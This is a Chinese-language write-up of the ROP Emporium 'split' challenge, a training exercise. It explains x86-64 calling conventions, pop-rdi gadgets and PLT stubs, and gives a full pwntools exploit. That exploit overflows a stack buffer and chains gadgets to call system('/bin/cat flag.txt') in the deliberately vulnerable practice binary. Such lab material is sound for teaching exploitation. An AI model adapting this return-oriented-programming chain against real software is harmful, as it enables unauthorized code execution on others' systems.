# split

> ROP Emporium 第 2 题 | x86-64 Linux | 知识点: x64 调用约定 + pop gadget + PLT

## 题目简介

同样的 32 字节栈溢出。这次程序里没有现成的"赢函数",但是:
- 有 `system@plt` (动态链接的 system)
- 有硬编码字符串 `/bin/cat flag.txt` 在 `.data` 段

只要把字符串地址塞进 RDI(x64 第 1 个参数寄存器),然后调 system,等价于在 shell 里执行 `system("/bin/cat flag.txt")`。

## 核心知识点

- **x86-64 调用约定**: 参数依次在 RDI / RSI / RDX / RCX / R8 / R9,第 7 个开始走栈
- **POP gadget**: `pop rdi; ret` 一条指令,把栈顶 8 字节弹进 RDI 然后继续 ROP 链
- **PLT (Procedure Linkage Table)**: 动态链接二进制里 system 等函数的入口 stub。`system@plt` 是个 ~16 字节的 stub,跳过去等价于调 system 本体
- **gadget 链**: 多个小 gadget 串起来,每个干一件事,组合完成复杂逻辑
- **pwntools 自动化**: `elf.plt['system']` 取 PLT 地址,`elf.search()` 找字符串,`ROP(elf).find_gadget()` 找 gadget,等价于人手 `objdump + strings + ROPgadget`

## 二进制侦察

```bash
file ./split
checksec --file=split
# 同 ret2win: NX, 无 PIE, 无 canary
```

字符串在 `.data` 段:

```bash
strings -tx ./split | grep "flag"
# 601060 /bin/cat flag.txt
```

或者直接 `next(elf.search(b'/bin/cat flag.txt'))` 自动找。

## 漏洞分析

pwnme 同 ret2win,32 字节 buffer 被 read 读 96 字节。

## 攻击思路

### ROP 链

```
1. pwnme ret       → ret_gadget (对齐补偿)
2. ret_gadget      → pop_rdi gadget
3. pop_rdi         → 弹出栈顶 0x601060 进 RDI (RDI = "/bin/cat flag.txt")
4. pop_rdi 的 ret  → system@plt
5. system@plt      → 内部 execve, 执行 cat 命令, flag 输出
```

### 栈消耗顺序

栈从低到高(按 RSP 推进顺序):

```
ret_gadget 地址   ← pwnme ret 弹出这个
pop_rdi 地址      ← ret_gadget 的 ret 弹出
0x601060          ← pop_rdi 的 pop 弹出 (进 RDI)
system@plt 地址   ← pop_rdi 的 ret 弹出
```

## exploit

完整代码见 [exploit.py](./exploit.py)。

```python
from pwn import *

elf = context.binary = ELF('./split')
io = process('./split')

system_addr = elf.plt['system']
binsh_addr  = next(elf.search(b'/bin/cat flag.txt'))

rop = ROP(elf)
pop_rdi    = rop.find_gadget(['pop rdi', 'ret']).address
ret_gadget = rop.find_gadget(['ret']).address

payload  = b'A' * 40
payload += p64(ret_gadget)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

io.sendline(payload)
io.interactive()
```

## 关键细节

- **PLT vs 函数本体**: `system@plt` 是 stub,内部有"懒解析"机制(GOT 表),第一次调用时跳到 ld-linux 解析真实 system 地址,后续直接跳。对 ROP 来说当 PLT 是函数等价物即可
- **pwntools `elf.search()`**: 在 ELF 各段内搜字节序列,返回生成器,用 `next()` 取第一个匹配。比 `strings | grep` 高效

## Flag

```
ROPE{a_placeholder_32byte_flag!}
```

## 参考

- ROP Emporium: <https://ropemporium.com/challenge/split.html>
